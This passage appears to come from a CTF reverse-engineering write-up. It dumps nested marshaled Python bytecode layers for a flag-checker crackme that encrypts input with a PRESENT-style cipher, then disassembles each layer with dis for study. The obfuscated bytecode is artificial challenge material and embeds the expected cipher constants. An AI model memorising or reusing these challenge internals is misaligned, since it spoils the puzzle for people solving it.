\x01\x16\x01r\x0e\x00\x00\x00sF\x03\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00@\x00\x00\x00s\xa6\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01d\x02\x83\x01Z\x02e\x03e\x02\x83\x01d\x03k\x03r,e\x04d\x04\x83\x01\x01\x00e\x05d\x05\x83\x01\x01\x00e\x02d\x06d\x07\x85\x02\x19\x00e\x02d\x07d\x08\x85\x02\x19\x00e\x02d\x08d\t\x85\x02\x19\x00e\x02d\td\x03\x85\x02\x19\x00g\x04Z\x06d\nd\x0bd\x0cd\rg\x04Z\x07e\x00e\x06\x83\x01Z\x08e\td\x0e\x83\x01D\x00]$Z\ne\x07e\n\x19\x00e\x08e\n\x19\x00k\x03rte\x04d\x04\x83\x01\x01\x00e\x05d\x05\x83\x01\x01\x00qte\x04d\x0f\x83\x01\x01\x00d\x06S\x00)\x10c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x06\x00\x00\x00C\x00\x00\x00sp\x00\x00\x00d\x01&#125;\x01t\x00d\x02|\x01\x83\x02&#125;\x02g\x00&#125;\x03|\x00D\x00]T&#125;\x04t\x01|\x04\x83\x01&#125;\x05t\x02|\x01d\x03\x18\x00\x83\x01D\x00]&quot;&#125;\x06t\x03|\x05|\x02|\x06\x19\x00\x83\x02&#125;\x05t\x04|\x05\x83\x01&#125;\x05t\x05|\x05\x83\x01&#125;\x05q.t\x03|\x05|\x02d\x04\x19\x00\x83\x02&#125;\x07|\x03\xa0\x06|\x07\xa1\x01\x01\x00q\x16|\x03S\x00)\x05N\xe9 \x00\x00\x00l\x06\x00\x00\x00! 20\\X\xa8 1!\x02\x00\xe9\x01\x00\x00\x00\xe9\xff\xff\xff\xff)\x07Z\x13generateRoundkeys80Z\rstring2number\xda\x05rangeZ\x0baddRoundKeyZ\tsBoxLayerZ\x06pLayer\xda\x06append)\x08\xda\x06blocks\xda\x06roundsZ\troundkeysZ\x03outZ\x05block\xda\x05state\xda\x01iZ\x06cipher\xa9\x00r\t\x00\x00\x00\xda\x00\xda\x07encrypt\x02\x00\x00\x00s\x18\x00\x00\x00\x00\x01\x04\x01\n\x01\x04\x01\x08\x01\x08\x01\x10\x01\x0e\x01\x08\x01\n\x01\x0e\x01\x0c\x01r\x0b\x00\x00\x00z\x12pls input ur flag:r\x00\x00\x00\x00z\x0bwrong flag!\xe9\x00\x00\x00\x00N\xe9\x08\x00\x00\x00\xe9\x10\x00\x00\x00\xe9\x18\x00\x00\x00l\x04\x00\x00\x00\x9e\x1faH\xc4\x13d\rl\x05\x00\x00\x00b]t:\x94Z\x15\x18\x0e\x00l\x04\x00\x00\x000ek95\x04\xb2&quot;l\x05\x00\x00\x00\x88o\xeddY\x13\xb1L\x01\x00\xe9\x04\x00\x00\x00z\x08Correct!)\x0br\x0b\x00\x00\x00\xda\x05inputZ\x03inp\xda\x03len\xda\x05print\xda\x04exitr\x05\x00\x00\x00Z\x04cmpsZ\nout_blocksr\x03\x00\x00\x00r\x08\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00r\n\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x18\x00\x00\x00\x08\x0e\x08\x01\x0c\x01\x08\x01\x08\x01,\x01\x0c\x01\x08\x01\x0c\x01\x10\x01\x08\x01\n\x01N)\x05r\x0e\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x0c\x00\x00\x00r\x0c\x00\x00\x00r\x0c\x00\x00\x00r\r\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\t\n\x01N)\x05r\x0b\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x06\x00\x00\x00r\x06\x00\x00\x00r\x06\x00\x00\x00r\x07\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x03\n\x01N)\x05r\t\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x07\x00\x00\x00r\x07\x00\x00\x00r\x07\x00\x00\x00r\x08\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x06\n\x01N)\x05r\n\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x08\x00\x00\x00r\x08\x00\x00\x00r\x08\x00\x00\x00r\t\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x06\n\x01&#39;
code[3] = b&#39;c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00s.\x00\x00\x00d\x01&#125;\x01t\x00d\x02\x83\x01D\x00]\x1c&#125;\x02|\x01|\x00|\x02?\x00d\x03@\x00t\x01|\x02\x19\x00&gt;\x007\x00&#125;\x01q\x0c|\x01S\x00)\x04N\xe9\x00\x00\x00\x00\xe9@\x00\x00\x00\xe9\x01\x00\x00\x00)\x02\xda\x05rangeZ\x04PBox)\x03\xda\x05state\xda\x06output\xda\x01i\xa9\x00r\x07\x00\x00\x00\xda\x00\xda\x06pLayer\x02\x00\x00\x00s\x08\x00\x00\x00\x00\x01\x04\x01\x0c\x01\x1a\x01r\t\x00\x00\x00s\xac\x06\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x04\x00\x00\x00\x03\x00\x00\x00s\x1a\x00\x00\x00t\x00\x87\x00f\x01d\x01d\x02\x84\x08t\x01d\x03\x83\x01D\x00\x83\x01\x83\x01S\x00)\x04Nc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x05\x00\x00\x00\x13\x00\x00\x00s \x00\x00\x00g\x00|\x00]\x18&#125;\x01t\x00\x88\x00|\x01\x19\x00\x83\x01d\x00|\x01\x14\x00&gt;\x00\x91\x02q\x04S\x00)\x01\xe9\x08\x00\x00\x00)\x01\xda\x03ord)\x02\xda\x02.0\xda\x01c\xa9\x01\xda\x01i\xa9\x00\xda\x00\xda\n&lt;listcomp&gt;\x03\x00\x00\x00s\x04\x00\x00\x00\x06\x00\x02\x00z!string2number.&lt;locals&gt;.&lt;listcomp&gt;r\x00\x00\x00\x00)\x02\xda\x03sum\xda\x05ranger\x04\x00\x00\x00r\x06\x00\x00\x00r\x04\x00\x00\x00r\x07\x00\x00\x00\xda\rstring2number\x02\x00\x00\x00s\x02\x00\x00\x00\x00\x01r\x0b\x00\x00\x00s\x01\x05\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00st\x00\x00\x00g\x00&#125;\x02t\x00d\x01|\x01d\x01\x17\x00d\x01\x83\x03D\x00]Z&#125;\x03|\x02\xa0\x01|\x00d\x02?\x00\xa1\x01\x01\x00|\x00d\x03@\x00d\x04&gt;\x00|\x00d\x05?\x00\x17\x00&#125;\x00t\x02|\x00d\x06?\x00\x19\x00d\x06&gt;\x00|\x00d\x07d\x06\x13\x00d\x01\x18\x00@\x00\x17\x00&#125;\x00|\x00|\x03d\x08&gt;\x00|\x00d\x05?\x00A\x00N\x00&#125;\x00q\x14|\x02S\x00)\tN\xe9\x01\x00\x00\x00\xe9\x10\x00\x00\x00i\xff\xff\x07\x00\xe9=\x00\x00\x00\xe9\x13\x00\x00\x00\xe9L\x00\x00\x00\xe9\x02\x00\x00\x00\xe9\x0f\x00\x00\x00)\x03\xda\x05range\xda\x06appendZ\x04Sbox)\x04\xda\x03key\xda\x06roundsZ\troundkeys\xda\x01i\xa9\x00r\x0c\x00\x00\x00\xda\x00\xda\x13generateRoundkeys80\x02\x00\x00\x00s\x0e\x00\x00\x00\x00\x01\x04\x01\x14\x01\x0e\x01\x14\x01 \x01\x16\x01r\x0e\x00\x00\x00sF\x03\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00@\x00\x00\x00s\xa6\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01d\x02\x83\x01Z\x02e\x03e\x02\x83\x01d\x03k\x03r,e\x04d\x04\x83\x01\x01\x00e\x05d\x05\x83\x01\x01\x00e\x02d\x06d\x07\x85\x02\x19\x00e\x02d\x07d\x08\x85\x02\x19\x00e\x02d\x08d\t\x85\x02\x19\x00e\x02d\td\x03\x85\x02\x19\x00g\x04Z\x06d\nd\x0bd\x0cd\rg\x04Z\x07e\x00e\x06\x83\x01Z\x08e\td\x0e\x83\x01D\x00]$Z\ne\x07e\n\x19\x00e\x08e\n\x19\x00k\x03rte\x04d\x04\x83\x01\x01\x00e\x05d\x05\x83\x01\x01\x00qte\x04d\x0f\x83\x01\x01\x00d\x06S\x00)\x10c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x06\x00\x00\x00C\x00\x00\x00sp\x00\x00\x00d\x01&#125;\x01t\x00d\x02|\x01\x83\x02&#125;\x02g\x00&#125;\x03|\x00D\x00]T&#125;\x04t\x01|\x04\x83\x01&#125;\x05t\x02|\x01d\x03\x18\x00\x83\x01D\x00]&quot;&#125;\x06t\x03|\x05|\x02|\x06\x19\x00\x83\x02&#125;\x05t\x04|\x05\x83\x01&#125;\x05t\x05|\x05\x83\x01&#125;\x05q.t\x03|\x05|\x02d\x04\x19\x00\x83\x02&#125;\x07|\x03\xa0\x06|\x07\xa1\x01\x01\x00q\x16|\x03S\x00)\x05N\xe9 \x00\x00\x00l\x06\x00\x00\x00! 20\\X\xa8 1!\x02\x00\xe9\x01\x00\x00\x00\xe9\xff\xff\xff\xff)\x07Z\x13generateRoundkeys80Z\rstring2number\xda\x05rangeZ\x0baddRoundKeyZ\tsBoxLayerZ\x06pLayer\xda\x06append)\x08\xda\x06blocks\xda\x06roundsZ\troundkeysZ\x03outZ\x05block\xda\x05state\xda\x01iZ\x06cipher\xa9\x00r\t\x00\x00\x00\xda\x00\xda\x07encrypt\x02\x00\x00\x00s\x18\x00\x00\x00\x00\x01\x04\x01\n\x01\x04\x01\x08\x01\x08\x01\x10\x01\x0e\x01\x08\x01\n\x01\x0e\x01\x0c\x01r\x0b\x00\x00\x00z\x12pls input ur flag:r\x00\x00\x00\x00z\x0bwrong flag!\xe9\x00\x00\x00\x00N\xe9\x08\x00\x00\x00\xe9\x10\x00\x00\x00\xe9\x18\x00\x00\x00l\x04\x00\x00\x00\x9e\x1faH\xc4\x13d\rl\x05\x00\x00\x00b]t:\x94Z\x15\x18\x0e\x00l\x04\x00\x00\x000ek95\x04\xb2&quot;l\x05\x00\x00\x00\x88o\xeddY\x13\xb1L\x01\x00\xe9\x04\x00\x00\x00z\x08Correct!)\x0br\x0b\x00\x00\x00\xda\x05inputZ\x03inp\xda\x03len\xda\x05print\xda\x04exitr\x05\x00\x00\x00Z\x04cmpsZ\nout_blocksr\x03\x00\x00\x00r\x08\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00r\n\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x18\x00\x00\x00\x08\x0e\x08\x01\x0c\x01\x08\x01\x08\x01,\x01\x0c\x01\x08\x01\x0c\x01\x10\x01\x08\x01\n\x01N)\x05r\x0e\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x0c\x00\x00\x00r\x0c\x00\x00\x00r\x0c\x00\x00\x00r\r\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\t\n\x01N)\x05r\x0b\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x06\x00\x00\x00r\x06\x00\x00\x00r\x06\x00\x00\x00r\x07\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x03\n\x01N)\x05r\t\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x07\x00\x00\x00r\x07\x00\x00\x00r\x07\x00\x00\x00r\x08\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x06\n\x01&#39;
code[4] = b&#39;c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x04\x00\x00\x00\x03\x00\x00\x00s\x1a\x00\x00\x00t\x00\x87\x00f\x01d\x01d\x02\x84\x08t\x01d\x03\x83\x01D\x00\x83\x01\x83\x01S\x00)\x04Nc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x05\x00\x00\x00\x13\x00\x00\x00s \x00\x00\x00g\x00|\x00]\x18&#125;\x01t\x00\x88\x00|\x01\x19\x00\x83\x01d\x00|\x01\x14\x00&gt;\x00\x91\x02q\x04S\x00)\x01\xe9\x08\x00\x00\x00)\x01\xda\x03ord)\x02\xda\x02.0\xda\x01c\xa9\x01\xda\x01i\xa9\x00\xda\x00\xda\n&lt;listcomp&gt;\x03\x00\x00\x00s\x04\x00\x00\x00\x06\x00\x02\x00z!string2number.&lt;locals&gt;.&lt;listcomp&gt;r\x00\x00\x00\x00)\x02\xda\x03sum\xda\x05ranger\x04\x00\x00\x00r\x06\x00\x00\x00r\x04\x00\x00\x00r\x07\x00\x00\x00\xda\rstring2number\x02\x00\x00\x00s\x02\x00\x00\x00\x00\x01r\x0b\x00\x00\x00s\x01\x05\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00st\x00\x00\x00g\x00&#125;\x02t\x00d\x01|\x01d\x01\x17\x00d\x01\x83\x03D\x00]Z&#125;\x03|\x02\xa0\x01|\x00d\x02?\x00\xa1\x01\x01\x00|\x00d\x03@\x00d\x04&gt;\x00|\x00d\x05?\x00\x17\x00&#125;\x00t\x02|\x00d\x06?\x00\x19\x00d\x06&gt;\x00|\x00d\x07d\x06\x13\x00d\x01\x18\x00@\x00\x17\x00&#125;\x00|\x00|\x03d\x08&gt;\x00|\x00d\x05?\x00A\x00N\x00&#125;\x00q\x14|\x02S\x00)\tN\xe9\x01\x00\x00\x00\xe9\x10\x00\x00\x00i\xff\xff\x07\x00\xe9=\x00\x00\x00\xe9\x13\x00\x00\x00\xe9L\x00\x00\x00\xe9\x02\x00\x00\x00\xe9\x0f\x00\x00\x00)\x03\xda\x05range\xda\x06appendZ\x04Sbox)\x04\xda\x03key\xda\x06roundsZ\troundkeys\xda\x01i\xa9\x00r\x0c\x00\x00\x00\xda\x00\xda\x13generateRoundkeys80\x02\x00\x00\x00s\x0e\x00\x00\x00\x00\x01\x04\x01\x14\x01\x0e\x01\x14\x01 \x01\x16\x01r\x0e\x00\x00\x00sF\x03\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00@\x00\x00\x00s\xa6\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01d\x02\x83\x01Z\x02e\x03e\x02\x83\x01d\x03k\x03r,e\x04d\x04\x83\x01\x01\x00e\x05d\x05\x83\x01\x01\x00e\x02d\x06d\x07\x85\x02\x19\x00e\x02d\x07d\x08\x85\x02\x19\x00e\x02d\x08d\t\x85\x02\x19\x00e\x02d\td\x03\x85\x02\x19\x00g\x04Z\x06d\nd\x0bd\x0cd\rg\x04Z\x07e\x00e\x06\x83\x01Z\x08e\td\x0e\x83\x01D\x00]$Z\ne\x07e\n\x19\x00e\x08e\n\x19\x00k\x03rte\x04d\x04\x83\x01\x01\x00e\x05d\x05\x83\x01\x01\x00qte\x04d\x0f\x83\x01\x01\x00d\x06S\x00)\x10c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x06\x00\x00\x00C\x00\x00\x00sp\x00\x00\x00d\x01&#125;\x01t\x00d\x02|\x01\x83\x02&#125;\x02g\x00&#125;\x03|\x00D\x00]T&#125;\x04t\x01|\x04\x83\x01&#125;\x05t\x02|\x01d\x03\x18\x00\x83\x01D\x00]&quot;&#125;\x06t\x03|\x05|\x02|\x06\x19\x00\x83\x02&#125;\x05t\x04|\x05\x83\x01&#125;\x05t\x05|\x05\x83\x01&#125;\x05q.t\x03|\x05|\x02d\x04\x19\x00\x83\x02&#125;\x07|\x03\xa0\x06|\x07\xa1\x01\x01\x00q\x16|\x03S\x00)\x05N\xe9 \x00\x00\x00l\x06\x00\x00\x00! 20\\X\xa8 1!\x02\x00\xe9\x01\x00\x00\x00\xe9\xff\xff\xff\xff)\x07Z\x13generateRoundkeys80Z\rstring2number\xda\x05rangeZ\x0baddRoundKeyZ\tsBoxLayerZ\x06pLayer\xda\x06append)\x08\xda\x06blocks\xda\x06roundsZ\troundkeysZ\x03outZ\x05block\xda\x05state\xda\x01iZ\x06cipher\xa9\x00r\t\x00\x00\x00\xda\x00\xda\x07encrypt\x02\x00\x00\x00s\x18\x00\x00\x00\x00\x01\x04\x01\n\x01\x04\x01\x08\x01\x08\x01\x10\x01\x0e\x01\x08\x01\n\x01\x0e\x01\x0c\x01r\x0b\x00\x00\x00z\x12pls input ur flag:r\x00\x00\x00\x00z\x0bwrong flag!\xe9\x00\x00\x00\x00N\xe9\x08\x00\x00\x00\xe9\x10\x00\x00\x00\xe9\x18\x00\x00\x00l\x04\x00\x00\x00\x9e\x1faH\xc4\x13d\rl\x05\x00\x00\x00b]t:\x94Z\x15\x18\x0e\x00l\x04\x00\x00\x000ek95\x04\xb2&quot;l\x05\x00\x00\x00\x88o\xeddY\x13\xb1L\x01\x00\xe9\x04\x00\x00\x00z\x08Correct!)\x0br\x0b\x00\x00\x00\xda\x05inputZ\x03inp\xda\x03len\xda\x05print\xda\x04exitr\x05\x00\x00\x00Z\x04cmpsZ\nout_blocksr\x03\x00\x00\x00r\x08\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00r\n\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x18\x00\x00\x00\x08\x0e\x08\x01\x0c\x01\x08\x01\x08\x01,\x01\x0c\x01\x08\x01\x0c\x01\x10\x01\x08\x01\n\x01N)\x05r\x0e\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x0c\x00\x00\x00r\x0c\x00\x00\x00r\x0c\x00\x00\x00r\r\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\t\n\x01N)\x05r\x0b\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x06\x00\x00\x00r\x06\x00\x00\x00r\x06\x00\x00\x00r\x07\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x03\n\x01&#39;
code[5] = b&#39;c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00st\x00\x00\x00g\x00&#125;\x02t\x00d\x01|\x01d\x01\x17\x00d\x01\x83\x03D\x00]Z&#125;\x03|\x02\xa0\x01|\x00d\x02?\x00\xa1\x01\x01\x00|\x00d\x03@\x00d\x04&gt;\x00|\x00d\x05?\x00\x17\x00&#125;\x00t\x02|\x00d\x06?\x00\x19\x00d\x06&gt;\x00|\x00d\x07d\x06\x13\x00d\x01\x18\x00@\x00\x17\x00&#125;\x00|\x00|\x03d\x08&gt;\x00|\x00d\x05?\x00A\x00N\x00&#125;\x00q\x14|\x02S\x00)\tN\xe9\x01\x00\x00\x00\xe9\x10\x00\x00\x00i\xff\xff\x07\x00\xe9=\x00\x00\x00\xe9\x13\x00\x00\x00\xe9L\x00\x00\x00\xe9\x02\x00\x00\x00\xe9\x0f\x00\x00\x00)\x03\xda\x05range\xda\x06appendZ\x04Sbox)\x04\xda\x03key\xda\x06roundsZ\troundkeys\xda\x01i\xa9\x00r\x0c\x00\x00\x00\xda\x00\xda\x13generateRoundkeys80\x02\x00\x00\x00s\x0e\x00\x00\x00\x00\x01\x04\x01\x14\x01\x0e\x01\x14\x01 \x01\x16\x01r\x0e\x00\x00\x00sF\x03\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00@\x00\x00\x00s\xa6\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01d\x02\x83\x01Z\x02e\x03e\x02\x83\x01d\x03k\x03r,e\x04d\x04\x83\x01\x01\x00e\x05d\x05\x83\x01\x01\x00e\x02d\x06d\x07\x85\x02\x19\x00e\x02d\x07d\x08\x85\x02\x19\x00e\x02d\x08d\t\x85\x02\x19\x00e\x02d\td\x03\x85\x02\x19\x00g\x04Z\x06d\nd\x0bd\x0cd\rg\x04Z\x07e\x00e\x06\x83\x01Z\x08e\td\x0e\x83\x01D\x00]$Z\ne\x07e\n\x19\x00e\x08e\n\x19\x00k\x03rte\x04d\x04\x83\x01\x01\x00e\x05d\x05\x83\x01\x01\x00qte\x04d\x0f\x83\x01\x01\x00d\x06S\x00)\x10c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x06\x00\x00\x00C\x00\x00\x00sp\x00\x00\x00d\x01&#125;\x01t\x00d\x02|\x01\x83\x02&#125;\x02g\x00&#125;\x03|\x00D\x00]T&#125;\x04t\x01|\x04\x83\x01&#125;\x05t\x02|\x01d\x03\x18\x00\x83\x01D\x00]&quot;&#125;\x06t\x03|\x05|\x02|\x06\x19\x00\x83\x02&#125;\x05t\x04|\x05\x83\x01&#125;\x05t\x05|\x05\x83\x01&#125;\x05q.t\x03|\x05|\x02d\x04\x19\x00\x83\x02&#125;\x07|\x03\xa0\x06|\x07\xa1\x01\x01\x00q\x16|\x03S\x00)\x05N\xe9 \x00\x00\x00l\x06\x00\x00\x00! 20\\X\xa8 1!\x02\x00\xe9\x01\x00\x00\x00\xe9\xff\xff\xff\xff)\x07Z\x13generateRoundkeys80Z\rstring2number\xda\x05rangeZ\x0baddRoundKeyZ\tsBoxLayerZ\x06pLayer\xda\x06append)\x08\xda\x06blocks\xda\x06roundsZ\troundkeysZ\x03outZ\x05block\xda\x05state\xda\x01iZ\x06cipher\xa9\x00r\t\x00\x00\x00\xda\x00\xda\x07encrypt\x02\x00\x00\x00s\x18\x00\x00\x00\x00\x01\x04\x01\n\x01\x04\x01\x08\x01\x08\x01\x10\x01\x0e\x01\x08\x01\n\x01\x0e\x01\x0c\x01r\x0b\x00\x00\x00z\x12pls input ur flag:r\x00\x00\x00\x00z\x0bwrong flag!\xe9\x00\x00\x00\x00N\xe9\x08\x00\x00\x00\xe9\x10\x00\x00\x00\xe9\x18\x00\x00\x00l\x04\x00\x00\x00\x9e\x1faH\xc4\x13d\rl\x05\x00\x00\x00b]t:\x94Z\x15\x18\x0e\x00l\x04\x00\x00\x000ek95\x04\xb2&quot;l\x05\x00\x00\x00\x88o\xeddY\x13\xb1L\x01\x00\xe9\x04\x00\x00\x00z\x08Correct!)\x0br\x0b\x00\x00\x00\xda\x05inputZ\x03inp\xda\x03len\xda\x05print\xda\x04exitr\x05\x00\x00\x00Z\x04cmpsZ\nout_blocksr\x03\x00\x00\x00r\x08\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00r\n\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x18\x00\x00\x00\x08\x0e\x08\x01\x0c\x01\x08\x01\x08\x01,\x01\x0c\x01\x08\x01\x0c\x01\x10\x01\x08\x01\n\x01N)\x05r\x0e\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x0c\x00\x00\x00r\x0c\x00\x00\x00r\x0c\x00\x00\x00r\r\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\t\n\x01&#39;
code[6] = b&#39;c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00@\x00\x00\x00s\xa6\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01d\x02\x83\x01Z\x02e\x03e\x02\x83\x01d\x03k\x03r,e\x04d\x04\x83\x01\x01\x00e\x05d\x05\x83\x01\x01\x00e\x02d\x06d\x07\x85\x02\x19\x00e\x02d\x07d\x08\x85\x02\x19\x00e\x02d\x08d\t\x85\x02\x19\x00e\x02d\td\x03\x85\x02\x19\x00g\x04Z\x06d\nd\x0bd\x0cd\rg\x04Z\x07e\x00e\x06\x83\x01Z\x08e\td\x0e\x83\x01D\x00]$Z\ne\x07e\n\x19\x00e\x08e\n\x19\x00k\x03rte\x04d\x04\x83\x01\x01\x00e\x05d\x05\x83\x01\x01\x00qte\x04d\x0f\x83\x01\x01\x00d\x06S\x00)\x10c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x06\x00\x00\x00C\x00\x00\x00sp\x00\x00\x00d\x01&#125;\x01t\x00d\x02|\x01\x83\x02&#125;\x02g\x00&#125;\x03|\x00D\x00]T&#125;\x04t\x01|\x04\x83\x01&#125;\x05t\x02|\x01d\x03\x18\x00\x83\x01D\x00]&quot;&#125;\x06t\x03|\x05|\x02|\x06\x19\x00\x83\x02&#125;\x05t\x04|\x05\x83\x01&#125;\x05t\x05|\x05\x83\x01&#125;\x05q.t\x03|\x05|\x02d\x04\x19\x00\x83\x02&#125;\x07|\x03\xa0\x06|\x07\xa1\x01\x01\x00q\x16|\x03S\x00)\x05N\xe9 \x00\x00\x00l\x06\x00\x00\x00! 20\\X\xa8 1!\x02\x00\xe9\x01\x00\x00\x00\xe9\xff\xff\xff\xff)\x07Z\x13generateRoundkeys80Z\rstring2number\xda\x05rangeZ\x0baddRoundKeyZ\tsBoxLayerZ\x06pLayer\xda\x06append)\x08\xda\x06blocks\xda\x06roundsZ\troundkeysZ\x03outZ\x05block\xda\x05state\xda\x01iZ\x06cipher\xa9\x00r\t\x00\x00\x00\xda\x00\xda\x07encrypt\x02\x00\x00\x00s\x18\x00\x00\x00\x00\x01\x04\x01\n\x01\x04\x01\x08\x01\x08\x01\x10\x01\x0e\x01\x08\x01\n\x01\x0e\x01\x0c\x01r\x0b\x00\x00\x00z\x12pls input ur flag:r\x00\x00\x00\x00z\x0bwrong flag!\xe9\x00\x00\x00\x00N\xe9\x08\x00\x00\x00\xe9\x10\x00\x00\x00\xe9\x18\x00\x00\x00l\x04\x00\x00\x00\x9e\x1faH\xc4\x13d\rl\x05\x00\x00\x00b]t:\x94Z\x15\x18\x0e\x00l\x04\x00\x00\x000ek95\x04\xb2&quot;l\x05\x00\x00\x00\x88o\xeddY\x13\xb1L\x01\x00\xe9\x04\x00\x00\x00z\x08Correct!)\x0br\x0b\x00\x00\x00\xda\x05inputZ\x03inp\xda\x03len\xda\x05print\xda\x04exitr\x05\x00\x00\x00Z\x04cmpsZ\nout_blocksr\x03\x00\x00\x00r\x08\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00r\n\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x18\x00\x00\x00\x08\x0e\x08\x01\x0c\x01\x08\x01\x08\x01,\x01\x0c\x01\x08\x01\x0c\x01\x10\x01\x08\x01\n\x01&#39;
for i in range(7):
    print(&#39;ser-code: &#123;&#125;&#39;.format(7 - i))
    l = marshal.loads(code[i])
    dis.dis(l)
    print(&#39;============================================================================&#39;)
</code></pre>
